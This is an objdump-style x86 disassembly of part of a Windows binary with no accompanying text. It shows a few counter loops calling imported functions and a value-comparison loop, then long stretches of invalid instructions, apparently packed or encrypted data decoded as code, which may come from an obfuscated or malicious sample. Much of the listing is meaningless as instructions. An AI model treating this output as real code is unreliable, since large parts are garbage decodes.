  40eabe:	cmp    bl,BYTE PTR [edi+0x26]
  40eac1:	add    eax,ebx
  40eac3:	pop    ebx
  40eac4:	leave  
  40eac5:	ret    0x8
  40eac8:	push   ebp
  40eac9:	mov    ebp,esp
  40eacb:	push   ecx
  40eacc:	mov    DWORD PTR ds:0x433793,0x1f
  40ead6:	cmp    DWORD PTR ds:0x433793,0x0
  40eadd:	je     0x40eb79
  40eae3:	cmp    DWORD PTR ds:0x433793,0xc
  40eaea:	jne    0x40eafe
  40eaf0:	push   0x1b35
  40eaf5:	push   DWORD PTR [ebp-0x14]
  40eaf8:	call   DWORD PTR ds:0x412368
  40eafe:	cmp    DWORD PTR ds:0x433793,0xd
  40eb05:	jne    0x40eb18
  40eb0b:	mov    edx,DWORD PTR ds:0x433793
  40eb11:	dec    edx
  40eb12:	mov    DWORD PTR ds:0x433793,edx
  40eb18:	mov    edx,DWORD PTR ds:0x433793
  40eb1e:	dec    edx
  40eb1f:	mov    DWORD PTR ds:0x433793,edx
  40eb25:	jmp    0x40ead6
  40eb2a:	mov    DWORD PTR ds:0x4337d3,0x16
  40eb34:	cmp    DWORD PTR ds:0x4337d3,0x0
  40eb3b:	je     0x40eb79
  40eb41:	cmp    DWORD PTR ds:0x4337d3,0x17
  40eb48:	jne    0x40eb5f
  40eb4e:	push   DWORD PTR [ebp-0x14]
  40eb51:	push   DWORD PTR [ebp-0xc]
  40eb54:	push   0x495a
  40eb59:	call   DWORD PTR ds:0x4120ec
  40eb5f:	mov    eax,ds:0x4337d3
  40eb64:	dec    eax
  40eb65:	mov    ds:0x4337d3,eax
  40eb6a:	jmp    0x40eb34
  40eb6f:	mov    DWORD PTR ds:0x4337e3,0x352
  40eb79:	push   ecx
  40eb7a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40eb81:	sbb    DWORD PTR ds:0x43379b,edx
  40eb87:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40eb8e:	mov    eax,DWORD PTR [ebp-0x4]
  40eb91:	push   esi
  40eb92:	add    DWORD PTR ds:0x43382b,ebx
  40eb98:	mov    esi,DWORD PTR [ebp-0x8]
  40eb9b:	adc    ecx,edx
  40eb9d:	mov    edx,0x7510854
  40eba2:	jmp    0x40ed99
  40eba7:	imul   ebx,DWORD PTR [ebx+0x72cf420f],0x73
  40ebae:	mov    bl,0xda
  40ebb0:	jecxz  0x40eb5f
  40ebb2:	sbb    bh,BYTE PTR [edx+0x71]
  40ebb5:	sbb    eax,0x7ea59aba
  40ebba:	jle    0x40ec10
  40ebbc:	jg     0x40ec3c
  40ebbe:	jle    0x40ebd2
  40ebc0:	mov    eax,ds:0xc5e97322
  40ebc5:	repnz pop ss
  40ebc7:	out    0xde,al
  40ebc9:	ud1    ecx,DWORD PTR [esi-0x47]
  40ebcd:	mov    bh,0xb6
  40ebcf:	test   BYTE PTR [eax+eax*4+0x4e],ch
  40ebd3:	ffree  st(2)
  40ebd5:	sub    DWORD PTR [edx+0x70dcb128],0xda4bb2c9
  40ebdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebe0:	or     BYTE PTR [esi+0x1a4a937],ah
  40ebe6:	(bad)  
  40ebe7:	jno    0x40eb99
  40ebe9:	dec    esp
  40ebea:	push   ds
  40ebeb:	jae    0x40ec05
  40ebed:	gs ins DWORD PTR es:[edi],dx
  40ebef:	push   ecx
  40ebf0:	sahf   
  40ebf1:	jmp    0x40eba3
  40ebf3:	inc    edi
  40ebf4:	repz cs popf 
  40ebf7:	mov    ch,cl
  40ebf9:	xor    al,BYTE PTR [edx+0x55]
  40ebfc:	out    0x6,al
  40ebfe:	push   ss
  40ebff:	and    eax,0x7c4b1902
  40ec04:	(bad)  
  40ec05:	sub    al,0xd0
  40ec07:	pop    esi
  40ec08:	leave  
  40ec09:	icebp  
  40ec0a:	inc    esp
  40ec0b:	loop   0x40ec3a
  40ec0d:	leave  
  40ec0e:	sbb    ah,BYTE PTR [eax+0x6ea07850]
  40ec14:	retf   0x6354
  40ec17:	out    0x95,al
  40ec19:	test   al,0x2c
  40ec1b:	std    
  40ec1c:	dec    esp
  40ec1d:	push   esi
  40ec1e:	fstp   DWORD PTR [ebp+0xa]
  40ec21:	adc    esp,DWORD PTR ds:0x79fe0d47
  40ec27:	jnp    0x40eca6
  40ec29:	and    esp,ebp
  40ec2b:	cld    
  40ec2c:	pop    ecx
  40ec2d:	ins    DWORD PTR es:[edi],dx
  40ec2e:	lods   eax,DWORD PTR ds:[esi]
  40ec2f:	lods   al,BYTE PTR ds:[esi]
  40ec30:	mov    eax,ds:0x9597d48e
  40ec35:	push   eax
  40ec36:	aas    
  40ec37:	xchg   ebx,eax
  40ec38:	add    BYTE PTR [ebp-0x2e],bh
  40ec3b:	mov    esp,0xadbf71ef
  40ec40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec41:	pop    ss
  40ec42:	mov    cl,0xd6
  40ec44:	fisubr WORD PTR [eax-0x2e]
  40ec47:	and    al,BYTE PTR ds:0x81f5fbe6
  40ec4d:	cmp    al,0x2
  40ec4f:	outs   dx,BYTE PTR ds:[esi]
  40ec50:	jp     0x40ec81
  40ec52:	jne    0x40ec70
  40ec54:	sti    
  40ec55:	retf   0xfdf7
  40ec58:	(bad)  
  40ec59:	add    esi,DWORD PTR [ebx+0x20233c12]
  40ec5f:	pop    ds
  40ec60:	mov    ecx,eax
  40ec62:	jmp    DWORD PTR [eax+0x43]
  40ec65:	out    0x18,eax
  40ec67:	popf   
  40ec68:	and    eax,edi
  40ec6a:	dec    edx
  40ec6b:	fist   DWORD PTR es:[ecx-0x5a]
  40ec6f:	jns    0x40ec06
  40ec71:	and    ch,BYTE PTR [edi]
  40ec73:	mov    ch,ah
  40ec75:	jl     0x40ecd1
  40ec77:	xor    DWORD PTR [ecx-0x525d3628],ebx
  40ec7d:	add    al,0xec
  40ec7f:	nop
  40ec80:	stos   BYTE PTR es:[edi],al
  40ec81:	shl    BYTE PTR [esi-0x39],cl
  40ec84:	xchg   ecx,eax
  40ec85:	popa   
  40ec86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec87:	cli    
  40ec88:	sub    al,0xa5
  40ec8a:	aam    0x7b
  40ec8c:	aaa    
  40ec8d:	mov    dl,0x3e
  40ec8f:	mov    esi,0xebc4423e
  40ec94:	cmp    al,0x7
  40ec96:	and    al,BYTE PTR [ecx-0x22]
  40ec99:	sar    esp,cl
  40ec9b:	sbb    esp,DWORD PTR [esi+0x6a9e432c]
  40eca1:	and    ch,BYTE PTR [ecx+0x5406e335]
  40eca7:	mul    DWORD PTR [esi]
  40eca9:	jne    0x40ecf7
  40ecab:	sub    BYTE PTR [ecx+0x9227b62],ch
  40ecb1:	mov    dh,0x89
  40ecb3:	jbe    0x40ed1f
  40ecb5:	rol    BYTE PTR [edi],cl
  40ecb7:	fistp  DWORD PTR [ebx+ebp*1]
  40ecba:	mov    ecx,0xe88e6848
  40ecbf:	test   bh,cl
  40ecc1:	push   0xff530158
  40ecc6:	inc    ebp
  40ecc7:	ins    BYTE PTR es:[edi],dx
  40ecc8:	out    0x53,eax
  40ecca:	fwait
  40eccb:	push   esp
  40eccc:	mov    dh,0x6
  40ecce:	out    dx,eax
  40eccf:	inc    esi
  40ecd0:	jb     0x40ed4b
  40ecd2:	xor    al,0x91
  40ecd4:	jge    0x40ecca
  40ecd6:	sahf   
  40ecd7:	outs   dx,BYTE PTR ds:[esi]
  40ecd8:	pop    es
  40ecd9:	mov    eax,0xf9043ecd
  40ecde:	(bad)  
  40ecdf:	mov    al,0x52
  40ece1:	push   ecx
  40ece2:	hlt    
  40ece3:	jo     0x40ed45
  40ece5:	popf   
  40ece6:	add    eax,0xeaeb36bc
  40eceb:	dec    edi
  40ecec:	daa    
  40eced:	adc    ebp,esp
  40ecef:	frstor [eax]
  40ecf1:	pop    esp
  40ecf2:	mov    cl,0xc8
  40ecf4:	fsub   DWORD PTR [ecx+eiz*4+0xa]
  40ecf8:	adc    DWORD PTR [edi+eiz*8],esi
  40ecfb:	push   ecx
  40ecfc:	adc    eax,DWORD PTR [ebp-0x5ae71357]
  40ed02:	stc    
  40ed03:	call   0x3bed:0x62fb3938
  40ed0a:	gs xchg ebx,eax
  40ed0c:	jge    0x40ecc7
  40ed0e:	aaa    
  40ed0f:	arpl   WORD PTR [esi],di
  40ed11:	mov    eax,0xda365944
  40ed16:	imul   edi,DWORD PTR [edx+edi*2+0x946eefd],0xffffff8f
  40ed1e:	lods   al,BYTE PTR ds:[esi]
  40ed1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed20:	ins    BYTE PTR es:[edi],dx
  40ed21:	push   edx
  40ed22:	ret    
  40ed23:	repnz add DWORD PTR [ebx-0xb],esi
  40ed27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed28:	sub    BYTE PTR [edi-0x31],cl
  40ed2b:	pop    esp
  40ed2c:	nop
  40ed2d:	inc    ebp
  40ed2e:	sbb    eax,0x11d76e20
  40ed33:	and    al,0x18
  40ed35:	fdiv   DWORD PTR [edi+0x2c]
  40ed38:	sub    bl,BYTE PTR [esi+0x7c]
  40ed3b:	aas    
  40ed3c:	and    bh,dh
  40ed3e:	cmc    
  40ed3f:	icebp  
  40ed40:	or     ebx,DWORD PTR [ebx-0x21]
  40ed43:	inc    edx
  40ed44:	cmc    
  40ed45:	and    BYTE PTR [edx+eiz*4-0x66],bh
  40ed49:	fsub   DWORD PTR [ebx+edi*1]
  40ed4c:	xchg   DWORD PTR [edi-0x20],edx
  40ed4f:	pop    edi
  40ed50:	cdq    
  40ed51:	jns    0x40ed32
  40ed53:	and    dh,cl
  40ed55:	sub    eax,0x5b295c1b
  40ed5a:	mov    ebx,DWORD PTR [edi]
  40ed5c:	lods   al,BYTE PTR ds:[esi]
  40ed5d:	sti    
  40ed5e:	jo     0x40eddb
  40ed60:	(bad)  
  40ed61:	call   0x9d02ce22
  40ed66:	dec    ebp
  40ed67:	xchg   esi,eax
  40ed68:	(bad)  
  40ed69:	cli    
  40ed6a:	js     0x40ed5a
  40ed6c:	push   0xffffffb5
  40ed6e:	js     0x40ed5a
  40ed70:	mov    ebx,0x3a2fd796
  40ed75:	or     edi,esp
  40ed77:	mov    ebp,0x8e5d989b
  40ed7c:	data16 int 0xe4
  40ed7f:	inc    BYTE PTR [ebx+0x1f90efce]
  40ed85:	or     al,0x5f
  40ed87:	fsub   st,st(6)
  40ed89:	xchg   ebp,eax
  40ed8a:	or     cl,cl
  40ed8c:	bswap  ecx
  40ed8e:	adc    BYTE PTR [ecx+0x66],0x5d
  40ed92:	rol    BYTE PTR [esi+0x63],1
  40ed95:	xchg   edi,eax
  40ed96:	mov    edi,0xc2337ec5
  40ed9b:	sub    ecx,DWORD PTR ds:0x433753
  40eda1:	xor    esi,edx
  40eda3:	mov    DWORD PTR ds:0x4337d3,0x18
  40edad:	cmp    DWORD PTR ds:0x4337d3,0x0
  40edb4:	je     0x40edf4
  40edba:	cmp    DWORD PTR ds:0x4337d3,0x20
  40edc1:	jne    0x40ede2
  40edc7:	push   DWORD PTR [ebp-0x14]
  40edca:	push   DWORD PTR [ebp-0xc]
  40edcd:	push   0x5135
  40edd2:	push   0x2d1e
  40edd7:	push   0x400000
  40eddc:	call   DWORD PTR ds:0x4120f0
  40ede2:	mov    ecx,DWORD PTR ds:0x4337d3
  40ede8:	dec    ecx
  40ede9:	mov    DWORD PTR ds:0x4337d3,ecx
  40edef:	jmp    0x40edad
  40edf4:	mov    ecx,0x32729b
  40edf9:	add    esi,ecx
  40edfb:	add    eax,ecx
  40edfd:	imul   eax,esi
  40ee00:	mov    esi,DWORD PTR [ebp+0xc]
  40ee03:	cmp    esi,eax
  40ee05:	jne    0x40ee21
  40ee0b:	mov    eax,DWORD PTR [ebp-0x4]
  40ee0e:	mov    esi,DWORD PTR [ebp-0x8]
  40ee11:	xor    eax,edx
  40ee13:	xor    esi,edx
  40ee15:	add    eax,ecx
  40ee17:	add    esi,ecx
  40ee19:	imul   eax,esi
  40ee1c:	jmp    0x40f053
  40ee21:	mov    eax,DWORD PTR [ebp+0xc]
  40ee24:	mov    eax,DWORD PTR [eax+0x78]
  40ee27:	mov    DWORD PTR [ebp+0xc],eax
  40ee2a:	mov    eax,DWORD PTR [ebp-0x4]
  40ee2d:	mov    esi,DWORD PTR [ebp-0x8]
  40ee30:	xor    eax,edx
  40ee32:	xor    esi,edx
  40ee34:	add    eax,ecx
  40ee36:	add    esi,ecx
  40ee38:	imul   eax,esi
  40ee3b:	mov    esi,DWORD PTR [ebp+0xc]
  40ee3e:	cmp    esi,eax
  40ee40:	mov    eax,DWORD PTR [ebp-0x4]
  40ee43:	je     0x40ee0e
  40ee49:	xor    eax,edx
  40ee4b:	add    eax,ecx
  40ee4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ee50:	imul   eax,ecx
  40ee53:	add    eax,DWORD PTR [ebp+0x8]
  40ee56:	mov    DWORD PTR [ebp+0xc],eax
  40ee59:	jmp    0x40f050
  40ee5e:	mov    dl,0xbd
  40ee60:	push   0xffffffdc
  40ee62:	jno    0x40ee4d
  40ee64:	mov    al,0x51
  40ee66:	ja     0x40eebe
  40ee68:	sbb    edx,DWORD PTR [edx+0x34befa15]
  40ee6e:	lock mov ds:0x7f547e7e,eax
  40ee74:	jle    0x40eef4
  40ee76:	cmc    
  40ee77:	cwde   
  40ee78:	sub    esp,DWORD PTR [esp+eiz*2-0x16]
  40ee7c:	push   esi
  40ee7d:	cld    
  40ee7e:	push   es
  40ee7f:	loope  0x40ee72
  40ee81:	jns    0x40eec4
  40ee83:	lds    esp,FWORD PTR [ecx+0x13]
  40ee86:	jmp    0x40ee66
  40ee88:	outs   dx,DWORD PTR ds:[esi]
  40ee89:	pop    ecx
  40ee8a:	xchg   BYTE PTR [esi],cl
  40ee8c:	xchg   ebp,eax
  40ee8d:	sub    BYTE PTR [edi-0x73],0x26
  40ee91:	bound  eax,QWORD PTR [ebx-0x12]
  40ee94:	mov    BYTE PTR [ebx],cl
  40ee96:	ins    DWORD PTR es:[edi],dx
  40ee97:	lds    eax,FWORD PTR [ebx]
  40ee99:	bound  esi,QWORD PTR [edx+0x6fdaf2d5]
  40ee9f:	lods   eax,DWORD PTR ds:[esi]
  40eea0:	lods   al,BYTE PTR ds:[esi]
  40eea1:	in     al,0x87
  40eea3:	cli    
  40eea4:	and    edi,esp
  40eea6:	retf   
  40eea7:	sbb    al,0xb3
  40eea9:	in     al,0x43
  40eeab:	xor    eax,0xb515cc7f
  40eeb0:	test   eax,0x2c3f7688
  40eeb5:	pop    ss
  40eeb6:	ins    BYTE PTR es:[edi],dx
  40eeb7:	mov    ss,WORD PTR [edx-0x44]
  40eeba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eebb:	mov    dl,0x9e
  40eebd:	mov    BYTE PTR [edi+edi*8+0x7789462c],0x91
  40eec5:	adc    DWORD PTR [edx+0x31],esi
  40eec8:	retf   
  40eec9:	cdq    
  40eeca:	push   ebp
  40eecb:	inc    ecx
  40eecc:	sub    eax,0xc5f6a524
  40eed1:	(bad)  
  40eed2:	pop    es
  40eed3:	inc    edx
  40eed4:	cmp    ch,BYTE PTR [edi+0x591cefb8]
  40eeda:	mov    BYTE PTR ds:0x5be8cf67,bh
  40eee0:	addr16 adc bl,dh
  40eee3:	jmp    0xe5f9:0xce8f7c97
  40eeea:	xlat   BYTE PTR ds:[ebx]
  40eeeb:	xchg   esp,eax
  40eeec:	loopne 0x40ef6a
  40eeee:	popa   
  40eeef:	stc    
  40eef0:	mov    ch,0xbd
  40eef2:	pusha  
  40eef3:	or     eax,0x653d5ffa
  40eef8:	dec    ebx
  40eef9:	dec    eax
  40eefa:	aas    
  40eefb:	push   es
  40eefc:	in     eax,0x1a
  40eefe:	aaa    
  40eeff:	(bad)  
  40ef00:	fdivr  QWORD PTR [ebx-0x35ffa15f]
  40ef06:	stos   DWORD PTR es:[edi],eax
  40ef07:	pop    es
  40ef08:	lds    ebx,FWORD PTR [ebp+ebx*8+0x79]
  40ef0c:	or     eax,0x4797e5e
  40ef11:	push   esp
  40ef12:	add    esp,DWORD PTR ds:[esi+0x41f36dc]
  40ef19:	dec    ebp
  40ef1a:	and    eax,0x583a7846
  40ef1f:	jns    0x40eef3
  40ef21:	add    ah,BYTE PTR [ebx]
  40ef23:	(bad)  
  40ef24:	repnz xchg esp,ecx
  40ef27:	imul   esi,DWORD PTR [ebx-0x47],0x909bd21a
  40ef2e:	enter  0xd5fb,0xf9
  40ef32:	push   0x30e3195b
  40ef37:	push   ecx
  40ef38:	xchg   edx,eax
  40ef39:	mov    edi,0x278161d4
  40ef3e:	dec    esi
  40ef3f:	test   eax,0x7cd23dcf
  40ef44:	mov    edi,0x1ed40564
  40ef49:	adc    eax,DWORD PTR [ecx+0x18]
  40ef4c:	sahf   
  40ef4d:	mul    BYTE PTR ds:0x9e6a1195
  40ef53:	cmc    
  40ef54:	xchg   ebx,eax
  40ef55:	and    dl,BYTE PTR [ebp+0x3b]
  40ef58:	and    eax,0xc4081b63
  40ef5d:	mov    ebp,DWORD PTR [ebx+edx*8-0x63]
  40ef61:	in     al,0x77
  40ef63:	push   ecx
  40ef64:	sbb    eax,0xa8d582dd
  40ef69:	setne  BYTE PTR [eax+0x4e5ef142]
  40ef70:	xchg   ebx,eax
  40ef71:	loop   0x40ef82
  40ef73:	xchg   ebx,eax
  40ef74:	xor    DWORD PTR [edx],esp
  40ef76:	lods   al,BYTE PTR ds:[esi]
  40ef77:	mov    eax,0x5c335433
  40ef7c:	hlt    
  40ef7d:	aas    
  40ef7e:	ss xchg edi,eax
  40ef80:	mov    WORD PTR [edi-0x46b6cf41],cs
  40ef86:	sub    al,0x5a
  40ef88:	push   ss
  40ef89:	and    DWORD PTR [eax+0x3c],edx
  40ef8c:	enter  0x69a3,0xba
  40ef90:	jo     0x40ef47
  40ef92:	sbb    eax,0x4bdc04b5
  40ef97:	or     bh,BYTE PTR [edi+0xfce2d31]
  40ef9d:	mov    edi,0x8c1a8d8
  40efa2:	push   ss
  40efa3:	(bad)  
  40efa4:	shr    DWORD PTR [edx+0x1a],1
  40efa7:	mov    bh,0xe6
  40efa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efaa:	xchg   esi,eax
  40efab:	jg     0x40efff
  40efad:	das    
  40efae:	pusha  
  40efaf:	mov    al,0xcc
  40efb1:	pusha  
  40efb2:	je     0x40efdf
  40efb4:	aaa    
  40efb5:	push   0x2110a325
  40efba:	arpl   WORD PTR [eax-0x37],bp
  40efbd:	lods   al,BYTE PTR ds:[esi]
  40efbe:	fldenv [ecx-0x6e5ce6bf]
  40efc4:	dec    esi
  40efc5:	int    0xb0
  40efc7:	adc    al,0x83
  40efc9:	daa    
  40efca:	xchg   ebp,eax
  40efcb:	(bad)  
  40efcc:	mov    ds:0x7a280518,al
  40efd1:	and    BYTE PTR [edx-0x58d9fef6],0x46
  40efd8:	cli    
  40efd9:	and    dl,BYTE PTR [edx+edi*8]
  40efdc:	stos   BYTE PTR es:[edi],al
  40efdd:	mov    ebx,DWORD PTR [ebp-0xe]
  40efe0:	xor    cl,cl
  40efe2:	cmp    ah,BYTE PTR [ebp+eiz*2-0x79236e35]
  40efe9:	jecxz  0x40f052
  40efeb:	(bad)  
  40efed:	sahf   
  40efee:	xor    bh,BYTE PTR [edi+0x75]
  40eff1:	pushf  
  40eff2:	xchg   esp,eax
  40eff3:	jecxz  0x40f01f
  40eff5:	ror    esi,1
  40eff7:	inc    esp
  40eff8:	xor    dl,BYTE PTR [ebp-0x19709a18]
  40effe:	or     BYTE PTR ds:0x14859a,bh
  40f004:	retf   0x9ab4
  40f007:	rcl    DWORD PTR [edi],1
  40f009:	pop    ebx
  40f00a:	pop    ebp
  40f00b:	dec    ecx
  40f00c:	push   0xffffffc6
  40f00e:	ror    DWORD PTR [edx],0x13
  40f011:	mov    BYTE PTR [ebx+0x39],bl
  40f014:	daa    
  40f015:	and    BYTE PTR [eax+0x4],ch
  40f018:	mov    ch,0x44
  40f01a:	lahf   
  40f01b:	outs   dx,DWORD PTR ds:[esi]
  40f01c:	xlat   BYTE PTR ds:[ebx]
  40f01d:	add    al,0x46
  40f01f:	cwde   
  40f020:	pop    eax
  40f021:	cmp    BYTE PTR [esi+0x69],bh
  40f024:	popf   
  40f025:	jge    0x40efe0
  40f027:	dec    ecx
  40f028:	fwait
  40f029:	mov    ebp,DWORD PTR ds:0x21a8f3cb
  40f02f:	lods   al,BYTE PTR ds:[esi]
  40f030:	leave  
  40f031:	(bad)  
  40f033:	ins    DWORD PTR es:[edi],dx
  40f034:	or     BYTE PTR [eax-0xa],bl
  40f037:	dec    esi
  40f038:	cdq    
  40f039:	pop    edi
  40f03a:	mov    ds:0x3e4aeff5,eax
  40f03f:	test   eax,0xc993503a
  40f044:	fucom  st(7)
  40f046:	dec    edi
  40f047:	in     al,0xac
  40f049:	xor    bh,bh
  40f04b:	and    ch,BYTE PTR [edx+0x1c]
  40f04e:	ret    
  40f04f:	jg     0x40efdc
  40f051:	inc    ebp
  40f052:	or     al,0x5e
  40f054:	leave  
  40f055:	ret    0x8
  40f058:	push   ebp
  40f059:	mov    ebp,esp
  40f05b:	push   ecx
  40f05c:	push   ecx
  40f05d:	inc    DWORD PTR ds:0x43379b
  40f063:	jmp    0x40f382
  40f068:	inc    ecx
  40f069:	iret   
  40f06a:	scas   al,BYTE PTR es:[edi]
  40f06b:	(bad)  
  40f06c:	mov    al,0x67
  40f06e:	jno    0x40f0b9
  40f070:	sub    DWORD PTR ds:0xaf691594,ebx
  40f076:	jbe    0x40f08d
  40f078:	(bad)  
  40f079:	mov    eax,ds:0x7d7c7e7e
  40f07e:	jle    0x40f0fe
  40f080:	loop   0x40f00f
  40f082:	inc    edx
  40f083:	into   
  40f084:	or     ecx,DWORD PTR [eax-0x4d]
  40f087:	rcl    ah,1
  40f089:	mov    edx,0xf57c2e87
  40f08e:	sar    BYTE PTR [esi+0xe],1
  40f091:	jbe    0x40f0f3
  40f093:	xlat   BYTE PTR ds:[ebx]
  40f094:	xchg   edi,eax
  40f095:	loope  0x40f058
  40f097:	xlat   BYTE PTR ds:[ebx]
  40f098:	sub    esp,DWORD PTR [ebx]
  40f09a:	neg    DWORD PTR [esi-0x2450b5a9]
  40f0a0:	lods   eax,DWORD PTR ds:[esi]
  40f0a1:	xchg   esp,eax
  40f0a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0a3:	mov    dl,BYTE PTR [esi]
  40f0a5:	addr16 dec esi
  40f0a7:	mov    dh,BYTE PTR [edi+0x5333a69e]
  40f0ad:	dec    esp
  40f0ae:	push   edi
  40f0af:	pusha  
  40f0b0:	enter  0xcaf,0x2f
  40f0b4:	mov    ds:0xad477ddd,al
  40f0b9:	jno    0x40f079
  40f0bb:	dec    esi
  40f0bc:	addr16 xor eax,0x30903ebb
  40f0c2:	push   ss
  40f0c3:	dec    edi
  40f0c4:	adc    dh,BYTE PTR [esi-0x15]
  40f0c7:	int    0xb2
  40f0c9:	cmc    
  40f0ca:	cmp    al,0xcf
  40f0cc:	retf   0x360f
  40f0cf:	jle    0x40f087
  40f0d1:	and    esp,DWORD PTR [edx+0x36400e28]
  40f0d7:	sbb    ebx,DWORD PTR [esi-0x38]
  40f0da:	or     eax,0x834d1e74
  40f0df:	push   sp
  40f0e1:	dec    edi
  40f0e2:	push   esi
  40f0e3:	mov    fs,WORD PTR [eax+0x5c]
  40f0e6:	retf   
  40f0e7:	in     al,dx
  40f0e8:	mov    dl,0x8d
  40f0ea:	jno    0x40f08b
  40f0ec:	scas   eax,DWORD PTR es:[edi]
  40f0ed:	cmp    esi,esi
  40f0ef:	mov    bl,0x47
  40f0f1:	and    ch,BYTE PTR [eax-0x2d]
  40f0f4:	ds or  eax,0x2dee8815
  40f0fa:	or     esi,DWORD PTR ds:0x91c7451
  40f100:	xchg   ebx,eax
  40f101:	lahf   
  40f102:	jae    0x40f0ff
  40f104:	pop    es
  40f105:	ror    ecx,1
  40f107:	cmp    esp,ebx
  40f109:	das    
  40f10a:	dec    BYTE PTR [esp+eax*4]
  40f10d:	xchg   ebx,eax
  40f10e:	push   0x58
  40f110:	sub    al,0xb5
  40f112:	call   0x83127b99
  40f117:	jne    0x40f0ea
  40f119:	mov    esp,0x2f4bcab8
  40f11e:	imul   dl
  40f120:	and    BYTE PTR [ecx],ch
  40f122:	jo     0x40f155
  40f124:	ins    DWORD PTR es:[edi],dx
  40f125:	pop    ss
  40f126:	jmp    0x40f15c
  40f128:	and    DWORD PTR [ebp+0x1cc5d59d],eax
  40f12e:	jmp    0xadab:0xddea9819
  40f135:	jl     0x40f114
  40f137:	(bad)  
  40f138:	scas   eax,DWORD PTR es:[edi]
  40f139:	and    eax,0xabf85cf1
  40f13e:	(bad)  
  40f13f:	jno    0x40f1a6
  40f141:	push   es
  40f142:	xchg   ecx,eax
  40f143:	test   eax,0x45713529
  40f148:	pushf  
  40f149:	imul   BYTE PTR [ecx+0x1830eb6b]
  40f14f:	outs   dx,BYTE PTR ds:[esi]
  40f150:	mov    al,ds:0xddea914c
  40f155:	xor    eax,DWORD PTR [eax-0x5d]
  40f158:	push   ss
  40f159:	lahf   
  40f15a:	(bad)  
  40f15b:	adc    al,0xd2
  40f15d:	push   es
  40f15e:	fst    DWORD PTR [eax+0x6e]
  40f161:	pop    ds
  40f162:	adc    DWORD PTR [ebp-0x5b],ebp
  40f165:	and    DWORD PTR [ecx],edi
  40f167:	(bad)  
  40f169:	nop
  40f16a:	push   ss
  40f16b:	xchg   BYTE PTR [ebp-0x55],dh
  40f16e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f16f:	fistp  DWORD PTR [eax]
  40f171:	call   0xc63f59e0
  40f176:	add    dl,BYTE PTR [edx]
  40f178:	and    eax,0xcbd6b78c
  40f17d:	mov    ebx,0x508f4d29
  40f182:	pushf  
  40f183:	js     0x40f1ec
  40f185:	add    bh,BYTE PTR es:[esi+edx*8-0x75]
  40f18a:	push   ebx
  40f18b:	cdq    
  40f18c:	rol    BYTE PTR [ebx],1
  40f18e:	cmp    ah,BYTE PTR [ecx+0x459de077]
  40f194:	or     BYTE PTR [edi],0x2e
  40f197:	mov    eax,0xf3c530b0
  40f19c:	inc    ebx
  40f19d:	clc    
  40f19e:	sti    
  40f19f:	test   DWORD PTR [edx-0x43],esi
  40f1a2:	xchg   DWORD PTR [edx-0x7d462c92],eax
  40f1a8:	das    
  40f1a9:	sub    ecx,0x394b66
  40f1af:	mov    ecx,0x9deb90e3
  40f1b4:	dec    ebp
  40f1b5:	xchg   esp,eax
  40f1b6:	aad    0xc2
  40f1b8:	inc    esp
  40f1b9:	sahf   
  40f1ba:	out    dx,eax
  40f1bb:	daa    
  40f1bc:	mov    bh,0x90
  40f1be:	pop    eax
  40f1bf:	cld    
  40f1c0:	mov    ah,0x48
  40f1c2:	in     eax,0xaf
  40f1c4:	jmp    0x63dc:0x39b0686e
  40f1cb:	and    al,0x5a
  40f1cd:	int    0x68
  40f1cf:	mov    edi,0xb115c2b3
  40f1d4:	add    eax,0x2aee050e
  40f1d9:	inc    esi
  40f1da:	and    bh,BYTE PTR [esi+0xbb731bf]
  40f1e0:	dec    ebp
  40f1e1:	push   cs
  40f1e2:	daa    
  40f1e3:	outs   dx,BYTE PTR ds:[esi]
  40f1e4:	in     al,0xe8
  40f1e6:	loopne 0x40f202
  40f1e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1e9:	hlt    
  40f1ea:	adc    al,0xa0
  40f1ec:	lock (bad) 
  40f1ef:	mov    ecx,0x94d7f178
  40f1f4:	mov    esi,0xae154676
  40f1f9:	push   esp
  40f1fa:	pop    ebx
  40f1fb:	add    DWORD PTR ds:0x16df8be6,0x449fedfb
  40f205:	mov    ds:0x9564bb5d,al
  40f20a:	in     eax,dx
  40f20b:	popf   
  40f20c:	std    
  40f20d:	xor    eax,0x469a8593
  40f212:	and    bh,BYTE PTR [edi-0x6b44d2d8]
  40f218:	push   ebx
  40f219:	xchg   ebp,eax
  40f21b:	pop    edx
  40f21c:	xor    eax,0xe55de192
  40f221:	pop    edi
  40f222:	push   ecx
  40f223:	mov    dl,0x21
  40f225:	scas   eax,DWORD PTR es:[edi]
  40f226:	add    al,al
  40f228:	adc    DWORD PTR [eax+ebx*1-0x2cfa3a4d],ecx
  40f22f:	call   0x904:0xb7ccc60
  40f236:	push   0xffffffa6
  40f238:	adc    BYTE PTR [esp+edx*4-0x1e],cl
  40f23c:	fcom   DWORD PTR [edi+0x76bafe87]
  40f242:	sub    ebx,ebp
  40f244:	lahf   
  40f245:	add    al,0xec
  40f247:	inc    ecx
  40f248:	cdq    
  40f249:	sahf   
  40f24a:	mov    bl,0x6f
  40f24c:	daa    
  40f24d:	pop    ss
  40f24e:	out    dx,eax
  40f24f:	(bad)  
  40f250:	es test al,0x2f
  40f253:	mov    edx,0xb7c4dfa0
  40f258:	mov    al,0xed
  40f25a:	inc    edi
  40f25b:	or     edx,DWORD PTR ds:0x96aea350
  40f261:	pop    ecx
  40f262:	dec    edi
  40f263:	jge    0x40f1ec
  40f265:	into   
  40f266:	mov    eax,ds:0x5cce1f1a
  40f26b:	int3   
  40f26c:	jecxz  0x40f275
  40f26e:	(bad)  
  40f26f:	xor    bl,BYTE PTR [ebx]
  40f271:	sbb    edx,DWORD PTR [edx+0x15]
  40f274:	stos   BYTE PTR es:[edi],al
  40f275:	pop    es
  40f276:	fadd   QWORD PTR [esi]
  40f278:	into   
  40f279:	cmp    al,0x3e
